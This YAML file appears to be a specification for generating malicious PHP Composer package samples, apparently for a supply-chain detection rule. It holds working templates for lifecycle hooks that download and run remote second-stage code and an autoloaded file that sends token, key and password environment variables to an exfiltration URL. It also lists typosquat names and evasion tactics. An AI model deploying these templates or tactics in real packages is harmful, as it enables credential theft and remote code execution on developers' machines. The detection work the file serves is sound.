  - id: composer_post_install_cmd
    family: composer_lifecycle
    severity: critical
    real_world_examples:
      - name: "acquia/coding-standards malicious post-install-cmd (2023)"
        date: "2023-11-01"
        url: "https://blog.phylum.io/malicious-php-packages/"
      - name: "PHP packagist event-stream-style backdoor pattern"
        date: "2023-08-15"
        url: "https://blog.phylum.io/malicious-php-packages/"
    description: |
      Composer's `post-install-cmd` and `post-autoload-dump` lifecycle
      events run after every `composer install` / `composer update`.
      A malicious package can ship a one-line shell command in
      composer.json's `scripts` field that runs arbitrary code as the
      user invoking composer. Modern abuse usually downloads a second
      stage from a remote URL and executes it via `sh -c`. The apiary
      install-scripts rule fires on any non-trivial entry in the
      Composer lifecycle hook list.
    indicators:
      - scripts.post-install-cmd or scripts.post-autoload-dump set to a
        non-trivial shell command
      - curl / wget / php -r download of a second-stage payload
      - reference to /dev/tcp/ or a reverse-shell template
      - eval(file_get_contents()) of a remote URL
      - obfuscated PHP code in the dropped second stage
    injection_template_php: |
      // composer.json fragment - the lifecycle abuse pattern
      {
        "name": "{{VENDOR}}/{{PACKAGE}}",
        "version": "{{VERSION}}",
        "type": "library",
        "scripts": {
          "post-install-cmd": [
            "@php -r \"@file_put_contents(sys_get_temp_dir().'/h.php', @file_get_contents('{{STAGE_URL}}')); @include sys_get_temp_dir().'/h.php';\""
          ],
          "post-autoload-dump": [
            "@php -r \"@copy('{{STAGE_URL}}', sys_get_temp_dir().'/d.php'); @include sys_get_temp_dir().'/d.php';\""
          ]
        }
      }
    injection_target_files:
      - '"composer.json: scripts.post-install-cmd, scripts.post-autoload-dump"'
    template_variables:
      STAGE_URL:
        - '"https://exfil-archive.example.invalid/stage2.php"'
        - '"https://php-composer-update.xyz/s"'
        - '"https://packagist-stats.tk/s"'
      VENDOR:
        - '"acme"'
        - '"laravel-helpers"'
        - '"symfony-extras"'
      PACKAGE:
        - '"coding-standards"'
        - '"utils"'
        - '"helpers"'
      VERSION:
        - '"1.0.0"'
        - '"2.4.1"'
    variants_to_generate: 6
    diversity_strategies:
      - hide the URL inside a long base64 string and decode at runtime
      - use the @php callable form rather than the literal shell php binary
      - reference scripts.scripts-aliases as a second indirection
      - point STAGE_URL at a github raw URL on a freshly created repo

  - id: composer_typosquat
    family: composer_lifecycle
    severity: high
    real_world_examples:
      - name: "larvel/framework (typosquat of laravel/framework, multiple incidents)"
        date: "2024-03-15"
        url: "https://blog.phylum.io/malicious-php-packages/"
      - name: "symphony/symphony (typosquat of symfony/symfony)"
        date: "2023-09-05"
        url: "https://blog.phylum.io/malicious-php-packages/"
      - name: "monolog/monlog (typosquat of monolog/monolog)"
        date: "2024-01-20"
        url: "https://blog.phylum.io/malicious-php-packages/"
    description: |
      The Composer typosquat pattern relies on developers mistyping
      well-known vendor/package combinations. `larvel` for `laravel`,
      `symphony` for `symfony`, `monlog` for `monolog`. The typosquat
      package ships either a malicious `post-install-cmd` script or PHP
      source that runs on include. Even without a lifecycle script the
      package can carry an autoloaded class whose constructor
      side-effects exfiltrate environment variables.
    indicators:
      - vendor/package name differs from a popular package by a single
        character (Damerau Levenshtein distance 1)
      - new vendor account on Packagist with one release and no
        repository activity
      - composer.json description mirrors the legitimate package
      - autoload section includes a file that runs at require time
        (the `files` autoload form rather than `psr-4`)
      - GitHub source repo is empty or mirrors the legitimate one
    injection_template_php: |
      // src/AutoloadedExploit.php (file referenced from composer.json autoload.files)
      <?php
      // Triggered at every ``require 'vendor/autoload.php'``.
      try {
          $payload = json_encode([
              'host' => gethostname(),
              'user' => get_current_user(),
              'cwd'  => getcwd(),
              'env'  => array_filter($_ENV, function ($v, $k) {
                  return preg_match('/TOKEN|KEY|SECRET|PASSWORD/i', $k);
              }, ARRAY_FILTER_USE_BOTH),
          ]);
          $ctx = stream_context_create(['http' => [
              'method' => 'POST',
              'header' => "Content-Type: application/json\r\n",
              'content' => $payload,
              'timeout' => 5,
          ]]);
          @file_get_contents('{{EXFIL_URL}}', false, $ctx);
      } catch (\Throwable $e) {
          // swallow
      }
    injection_target_files:
      - '"composer.json: autoload.files = [src/AutoloadedExploit.php]"'
      - '"src/AutoloadedExploit.php: payload above"'
    template_variables:
      EXFIL_URL:
        - '"https://exfil-archive.example.invalid/c"'
        - '"https://php-pkg-stats.tk/r"'
      TYPOSQUAT_NAME:
        - '"larvel/framework"'
        - '"symphony/symphony"'
        - '"monlog/monlog"'
        - '"phpunlt/phpunit"'
    variants_to_generate: 5
    diversity_strategies:
      - combine the typosquat with a post-install-cmd for two execution chances
      - publish under a vendor that resembles the original (laravell)
      - mirror the original repo README and inflate stars by stealing forks
      - claim to be a maintained fork of the original in the description
